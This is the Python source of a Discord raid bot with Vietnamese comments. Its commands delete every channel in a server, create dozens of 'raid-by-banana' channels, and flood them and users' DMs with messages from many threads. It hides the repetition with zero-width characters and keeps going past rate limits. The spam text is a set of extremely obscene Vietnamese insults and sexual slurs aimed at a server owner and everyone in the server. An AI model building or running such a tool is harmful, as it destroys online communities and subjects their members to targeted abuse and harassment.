import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import threading
import random
import os
import requests
import time
from dotenv import load_dotenv
from colorama import Fore, Style, init

# Khởi tạo
init(autoreset=True)
load_dotenv()

# ==========================================
# CẤU HÌNH TỪ ENV
# ==========================================
TOKEN = os.getenv('DISCORD_TOKEN')
PREFIX = "!"
HEADERS = {'Authorization': f'Bot {TOKEN}'}

WAR_QUOTES = [
    "# ALO ĐÂU RỒI EM @everyone",
    "# CÚT RỒI À EM?, GÀ VẬY VÔ SOLO NÈ CON ĐĨ MÁ LỒN THẤM CHƯA CON CẶC LỒN ĐĨ OWNER SV GÀ NÓI CMM ĐI @everyone",
    "# MẤY CON ĐĨ CON MẸ GÀ VẬY MẤY CON LỒN VÔ TIẾP NÈ CON LỒN OWNER GÀ VAIZ LỒN RA JOIN SV BỐ M DẠY NÈ CON @everyone",
    "# CON LỒN ĐĨ MẸ CẦM 3 CÁI NGON TỪ ÓC CHÓ COPY HACKVIET VÔ WAR VỚI ANH MÀY HẢ CON, CÁI TRÌNH RA NGOÀI ĐƯỜNG MẤY ĐƯA NÍT CƯỜI THẤM BÀ CMM GIỜ, ĐÉO CÓ TRÌNH ĐỪNG CÓ WAR? @everyone",
    "# VÔ ĐÂY CHƠI NÈ CON CẶC LỒN 10 MẤY TUỔI MÀ T TƯỞNG MẤY THK 20 MẤY WAR GHÊ LẮM🤣 AI NGỜ MÀY CHỈ BIÊT COPY 3 CÁI DÒNG CỦA HVT THÔI GÀ THỀ VẪN LÀ GÀ TH EM ? @everyone",
    "# @everyone @here MÀY CẦM 3 CÁI NGÔN COPY CỦA MÀY GÕ VỚI ANH HẢ BỊ ANH ĐẠP VÔ CÁI HỌNG DÁI MÀY Ở BÊN BỜ ĐƯỜNG A CẦM SÚNG TỈA BÚNG VÔ CÁI LỖ HỌNG THỐI MẸ MÀY NGOÀI LỀ ĐƯỜNG CN ĐĨ MẸ MÀY ÓC CẶC BỊ ANH BEM DỒN 1 GÓC CẠNH CỦA CÁI BƯỚM MẸ MÀY THÂM NHƯ DÁI LỢN SẮP NGHẺO NHÀ TAO MÀ CON ĐĨ NGU ĂN BOÀI SỐNG QUA NGÀY GIÚP TĂNG THÊM TRÌNH ĐỘ ĂN HẠI CỦA MÀY ĐỪNG BỰC BỘI CHỨ CON NÍT CON NOI VỀ HỌC ĐI ĐỪNG ĐÚ ĐỞN ỚT ĐỎ CHỨNG TỎ EM ĐANG CAY ĐỪNG NỐI NHỮNG LỜI EM ĐANG GẶP PHẢI CHỨ KHÔNG CÓ ĂN HỌC RỒI NÊN NỐI CHUYỆN BỊ NGÁO HAY DO MẸ MÀY BẠI LIỆT NÃO NÊN SINH RA THẰNG CON BỊ KHỜ NGU HỌC PHÁT NGÔN NHỮNG CÂU BỊ XÃ HỘI XA LÁNH RUỒNG BỎ TẨY CHAY CON GÁI MẸ MÀY LẾT NGOÀI ĐƯỜNG BÚ PHÂN BÒ ĐỂ TRÁNH ĐÓI QUA NGÀY"
]

def get_pure_msg():
    invis = "".join(random.choices(["\u200b", "\u200c", "\u200d", "\u200e"], k=15))
    return f"{random.choice(WAR_QUOTES)} {invis}"

# ==========================================
# LOGIC HỦY DIỆT (REQUESTS)
# ==========================================

def fast_spam(channel_id):
    while True:
        r = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', 
                          headers=HEADERS, json={'content': get_pure_msg()})
        if r.status_code == 429:
            time.sleep(r.json().get('retry_after', 0.5))
        elif r.status_code != 200: break
        time.sleep(0.1)

def infinite_raid_loop(guild_id):
    while True:
        # Xóa kênh
        r = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=HEADERS)
        if r.status_code == 200:
            for ch in r.json():
                requests.delete(f"https://discord.com/api/v9/channels/{ch['id']}", headers=HEADERS)
        # Tạo & Spam
        for _ in range(40):
            res = requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', 
                                headers=HEADERS, json={'name': 'raid-by-banana', 'type': 0})
            if res.status_code == 201:
                cid = res.json()['id']
                for _ in range(3): threading.Thread(target=fast_spam, args=(cid,), daemon=True).start()
        time.sleep(15)

# ==========================================
# GIAO DIỆN CMD MENU
# ==========================================
def cmd_menu():
    while not bot.is_ready(): time.sleep(1)
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.RED + Style.BRIGHT + rf"""
    ██████╗  █████╗ ███╗   ██╗ █████╗ ███╗   ██╗ █████╗ 
    ██╔══██╗██╔══██╗████╗  ██║██╔══██╗████╗  ██║██╔══██╗
    ██████╔╝███████║██╔██╗ ██║███████║██╔██╗ ██║███████║
    ====================================================
    BOT: {bot.user} | ENV: LOADED
    ====================================================
    [1] SPAM ALL DMS (NÃ TIN NHẮN RIÊNG)
    [2] WAR QUA ID KÊNH (NÃ TỪ CMD)
    [3] XEM NGÔN CHIẾN (CHẠY LOGS)
    [4] THOÁT
    ====================================================
        """)
        choice = input(Fore.YELLOW + "👉 CHỌN: ")
        if choice == '1':
            for channel in bot.private_channels:
                threading.Thread(target=fast_spam, args=(channel.id,), daemon=True).start()
        elif choice == '2':
            cid = input(Fore.CYAN + "🆔 Nhập ID Kênh: ")
            threading.Thread(target=fast_spam, args=(cid,), daemon=True).start()
            input("Đang nã... Nhấn Enter để quay lại.")
        elif choice == '3':
            while True:
                print(Fore.WHITE + get_pure_msg())
                time.sleep(0.1)
        elif choice == '4': os._exit(0)

# ==========================================
# BOT DISCORD
# ==========================================
class VjpBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix=PREFIX, intents=discord.Intents.all())
        self.war_status = {}

    async def setup_hook(self):
        await self.tree.sync()

bot = VjpBot()

@bot.event
async def on_command(ctx):
    try: await ctx.message.delete()
    except: pass

@bot.command()
async def war(ctx):
    bot.war_status[ctx.channel.id] = True
    while bot.war_status.get(ctx.channel.id):
        await ctx.send(get_pure_msg())
        await asyncio.sleep(0.3)

@bot.command()
async def raid(ctx):
    threading.Thread(target=infinite_raid_loop, args=(ctx.guild.id,), daemon=True).start()

@bot.tree.command(name="raid", description="VJP PRO RAID")
async def raid_slash(interaction: discord.Interaction):
    await interaction.response.send_message("☢️ RAIDING...", ephemeral=True)
    threading.Thread(target=infinite_raid_loop, args=(interaction.guild.id,), daemon=True).start()

@bot.event
async def on_ready():
    threading.Thread(target=cmd_menu, daemon=True).start()

bot.run(TOKEN)
